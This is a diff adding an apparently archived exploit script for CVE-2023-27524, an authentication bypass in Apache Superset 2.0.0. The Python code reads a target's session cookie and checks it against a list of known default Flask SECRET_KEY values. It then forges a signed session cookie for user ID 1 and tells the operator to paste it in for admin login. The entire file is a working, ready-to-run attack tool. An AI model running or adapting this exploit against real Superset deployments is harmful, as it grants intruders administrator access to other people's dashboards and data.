@@ -1,0 +1,112 @@
+id: 38700
+date: 05/23/2023
+title: Apache Superset 2.0.0 - Authentication Bypass Exploit
+author: MaanVader
+cves: CVE-2023-27524
+
+# Exploit Title: Apache Superset 2.0.0 - Authentication Bypass
+# Exploit Author: MaanVader
+# Vendor Homepage: https://superset.apache.org/
+# Version: Apache Superset<= 2.0.1
+# Tested on: 2.0.0
+# CVE: CVE-2023-27524
+
+from flask_unsign import session
+import requests
+import urllib3
+import argparse
+import re
+from time import sleep
+from selenium import webdriver
+from urllib.parse import urlparse
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+SECRET_KEYS = [
+    b'\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h',  # version < 1.4.1
+    b'CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET',          # version >= 1.4.1
+    b'thisISaSECRET_1234',                            # deployment template
+    b'YOUR_OWN_RANDOM_GENERATED_SECRET_KEY',          # documentation
+    b'TEST_NON_DEV_SECRET'                            # docker compose
+]
+
+def main():
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--url', '-u', help='Base URL of Superset instance', required=True)
+    parser.add_argument('--id', help='User ID to forge session cookie for, default=1', required=False, default='1')
+    args = parser.parse_args()
+
+    try:
+        u = args.url.rstrip('/') + '/login/'
+
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:101.0) Gecko/20100101 Firefox/101.0'
+        }
+
+        resp = requests.get(u, headers=headers, verify=False, timeout=30, allow_redirects=False)
+        if resp.status_code != 200:
+            print(f'Error retrieving login page at {u}, status code: {resp.status_code}')
+            return
+
+        session_cookie = None
+        for c in resp.cookies:
+            if c.name == 'session':
+                session_cookie = c.value
+                break
+
+        if not session_cookie:
+            print('Error: No session cookie found')
+            return
+
+        print(f'Got session cookie: {session_cookie}')
+
+        try:
+            decoded = session.decode(session_cookie)
+            print(f'Decoded session cookie: {decoded}')
+        except:
+            print('Error: Not a Flask session cookie')
+            return
+
+        match = re.search(r'"version_string": "(.*?)&#34', resp.text)
+        if match:
+            version = match.group(1)
+        else:
+            version = 'Unknown'
+
+        print(f'Superset Version: {version}')
+
+            
+        for i, k in enumerate(SECRET_KEYS):
+            cracked = session.verify(session_cookie, k)
+            if cracked:
+                break
+
+        if not cracked:
+            print('Failed to crack session cookie')
+            return
+
+        print(f'Vulnerable to CVE-2023-27524 - Using default SECRET_KEY: {k}')
+
+        try:
+            user_id = int(args.id)
+        except:
+            user_id = args.id
+        
+        forged_cookie = session.sign({'_user_id': user_id, 'user_id': user_id}, k)
+        print(f'Forged session cookie for user {user_id}: {forged_cookie}')
+        u1 = args.url.rstrip('/') + '/superset/welcome'
+
+        print(f"Now visit the url: `{u1}` and replace the current session cookie with this `{forged_cookie}` and refresh the page and we will be logged in as admin to the dashboard:)")
+
+
+
+
+    except Exception as e:
+        print(f'Unexpected error: {e}')
+
+
+if __name__ == '__main__':
+    main()
+
+#  0day.today [2023-06-08]  #
